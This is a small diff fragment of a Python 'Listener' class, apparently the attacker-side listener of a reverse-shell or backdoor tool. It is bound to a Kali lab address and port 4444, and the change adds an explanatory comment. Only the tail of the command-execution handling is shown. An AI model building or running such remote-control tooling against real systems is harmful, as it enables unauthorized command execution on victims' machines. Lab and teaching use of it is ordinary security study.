@@ -61,6 +61,7 @@ class Listener:
             except Exception:
                 result="[-] Error during command execution"
             print(result)
-
-my_listener=Listener("10.0.2.15",4444)
+            
+                     # this is kali's_ip and port which you are listening on
+my_listener=Listener("10.0.2.15",4444)  
 my_listener.run()
